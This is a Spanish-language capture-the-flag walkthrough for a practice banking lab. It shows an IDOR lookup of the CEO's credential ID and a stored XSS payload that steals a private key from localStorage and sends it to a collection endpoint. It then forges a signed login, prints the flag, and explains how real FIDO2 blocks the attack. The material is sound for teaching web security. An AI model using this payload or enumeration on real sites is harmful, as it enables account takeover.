# Solución paso a paso — CTF "Passwordless de Cartón" (HackerBank)

Resolución desde el login. Objetivo: entrar a la cuenta del **CEO** y leer el
código ganador.

## La idea en una frase

El servidor guarda solo claves públicas (bien), pero deja la **clave privada del
CEO en su `localStorage`**. Con un **Stored XSS** ejecutado en el navegador del
CEO (un bot), le robás esa clave y entrás a su cuenta.

## Herramientas

- **Burp Suite** (proxy + Repeater).
- **DevTools** del navegador (Network + Console).
- Opcional: **Python** (`requests` + `cryptography`) — o hacés la firma final en
  la consola con `hbForge()`.

---

## Capa 1 — Reconocer el flujo (Burp)

Login como **`t3ny`** en `/login` (tocás la huella). En Burp ves:
1. `POST /auth/register` — tu navegador generó una passkey y registró **solo la
   clave pública**.
2. `POST /auth/challenge` `{username:"t3ny"}` → `{user_id, challenge}`.
3. `GET /auth/keys/<user_id>` → tu `credential_id`.
4. `POST /auth/verify` → sesión.

Observá: la clave privada **nunca viaja** (vive en `localStorage`, bajo
`hb_privkey_t3ny`).

## Capa 2 — IDOR: el credential_id del CEO

En el Repeater, variá `GET /auth/keys/<id>` (`7013`, `7025`, `7031`, `7058`). No
valida autorización (IDOR) y cada respuesta trae `username`/`display_name`, así
identificás **`7013` = ceo**. Guardá su `credential_id`. Con la pública no podés
firmar → te falta la privada.

## Capa 3 — Stored XSS: robar la clave privada del CEO

1. Logueado como `t3ny`, entrá a **Mensajes al administrador** (`/mensajes`) y
   dejá un mensaje con este payload:

```html
Hola, necesito ayuda con mi cuenta.
<script>
window.addEventListener("load", function () {
  var user = document.getElementById("nombre_usuario").innerText;
  if (user !== "t3ny") {                                    // es el CEO
    var priv = localStorage.getItem("hb_privkey_" + user); // su clave privada
    new Image().src = "/collect?data=" + encodeURIComponent(priv);
  }
});
</script>
```

2. Tocá **"Avisar al administrador"** (ingeniería social) → el bot CEO revisa su
   bandeja y ejecuta el payload.
3. Abrí **`/collected`**: ahí está la clave privada del CEO que exfiltró el XSS.

## Capa 4 — Firmar y entrar (consola F12)

Con el `credential_id` (Capa 2) y la clave privada (Capa 3). En la consola de una
página que cargue el script del sitio (por ejemplo **`/collected`** o `/login`):

```js
hbForge("ceo", "<credential_id del IDOR>", "<clave privada del buzón>")
```

`hbForge` pide un challenge fresco del CEO, lo firma con la clave robada y hace
`verify` → te redirige al dashboard del CEO con el código ganador
`f27ad11c21afef4f4c54a3930698f616` y la comparativa con FIDO2 real.

> Si preferís Python, `banco_app/solve.py` hace toda la cadena y te imprime la flag.

---

## Por qué FIDO2 real lo previene

| Lo que rompiste (FIDO2 de cartón) | Cómo lo previene FIDO2 real |
|---|---|
| Robaste la clave privada del CEO con un XSS | La clave vive en el TPM: JavaScript nunca puede leerla |
| La clave estaba en localStorage, al alcance de JS | En FIDO2 la clave nunca sale del hardware ni toca el navegador |
| Un mensaje malicioso ejecutó código en el CEO | Aunque haya XSS, del lado del cliente no hay clave privada que robar |
| Filtraste el credential_id con un IDOR | El credential_id no es secreto, pero sin la privada (inrobable) no sirve |
| Firmaste el challenge con la clave robada | Firmar exige la clave en hardware + verificación del usuario (biometría) |
